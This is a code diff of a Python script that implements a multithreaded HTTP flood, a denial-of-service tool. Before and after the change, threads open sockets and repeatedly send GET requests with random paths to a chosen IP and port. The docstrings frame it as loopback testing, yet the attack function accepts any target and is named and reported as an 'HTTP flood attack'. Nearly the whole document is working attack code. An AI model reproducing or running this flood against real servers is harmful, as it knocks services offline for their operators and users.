@@ -1,65 +1,62 @@
-import threading
-import socket
 import random
-import time
+import socket
+import threading
+import string
 
-# Generate a random URL for the attack
+def generate_random_ip():
+    """Generate a random IP address (loopback address 127.0.0.1)"""
+    return "127.0.0.1"
+
+def generate_random_port():
+    """Generate a random port number between 1024 and 65535"""
+    return random.randint(1024, 65535)
+
 def generate_random_url():
-    paths = ["", "index.html", "about.html", "contact.html", "products.html"]
-    random_path = random.choice(paths)
-    return f"/{random_path}"
+    """Generate a random URL with 5 characters"""
+    random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
+    return f"/{random_chars}"
 
-# HTTP request simulation
-def http_request(target_ip, target_port, num_requests):
-    """
-    Simulates sending HTTP requests to a target.
-    
-    Args:
-        target_ip (str): Target IP address (loopback for testing)
-        target_port (int): Target port (default 80 for HTTP)
-        num_requests (int): Number of HTTP requests to send
-    """
-    for _ in range(num_requests):
-        # Create a random URL
-        url = generate_random_url()
+def send_http_request(target_ip, target_port, random_port):
+    """Simulate sending a random HTTP request"""
+    try:
+        # Create a socket object and bind it to a random port
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind(("127.0.0.1", random_port))  # Bind to random port on localhost
+            s.connect((target_ip, target_port))
 
-        # Construct an HTTP GET request
-        request = f"GET {url} HTTP/1.1\r\n"
-        request += f"Host: {target_ip}:{target_port}\r\n"
-        request += "Connection: keep-alive\r\n"
-        request += "User-Agent: Mozilla/5.0\r\n"
-        request += "\r\n"
+            # Construct an HTTP GET request with a random URL
+            request = f"GET {generate_random_url()} HTTP/1.1\r\n"
+            request += f"Host: {target_ip}\r\n"
+            request += "Connection: keep-alive\r\n\r\n"
 
-        # Send the request
-        try:
-            # Create socket connection to the target IP and port
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((target_ip, target_port))
-                s.sendall(request.encode())
-        except Exception as e:
-            print(f"Error sending HTTP request: {e}")
+            # Send the request
+            s.sendall(request.encode())
+            
+            # Print the connection and content in the desired format
+            print(f"Connected by {s.getsockname()} Content is b '{request.encode()}'")
+            s.close()
 
-# Main function for launching the HTTP flood attack
+    except Exception as e:
+        print(f"Error in sending request: {e}")
+
 def http_flood_attack(target_ip, target_port, num_threads, num_requests_per_thread):
-    """
-    Launches an HTTP flood attack using multiple threads to simulate clients.
-    
-    Args:
-        target_ip (str): Target IP address (use 127.0.0.1 for testing)
-        target_port (int): Target port number (80 for HTTP)
-        num_threads (int): Number of threads (clients) to simulate
-        num_requests_per_thread (int): Number of requests each thread will send
-    """
+    """Flood the target server with HTTP requests using multiple threads"""
+    def attack_thread():
+        for _ in range(num_requests_per_thread):
+            random_port = generate_random_port()
+            send_http_request(target_ip, target_port, random_port)
+
+    # List to hold threads
     threads = []
-    
+
     # Create and start threads
     for i in range(num_threads):
-        thread = threading.Thread(target=http_request, args=(target_ip, target_port, num_requests_per_thread))
-        threads.append(thread)
-        thread.start()
+        t = threading.Thread(target=attack_thread)
+        threads.append(t)
+        t.start()
 
-    # Wait for all threads to complete
-    for thread in threads:
-        thread.join()
+    # Wait for all threads to finish
+    for t in threads:
+        t.join()
 
-    print(f"HTTP flood attack completed. {num_threads * num_requests_per_thread} requests sent.")
+    print("HTTP flood attack completed.")
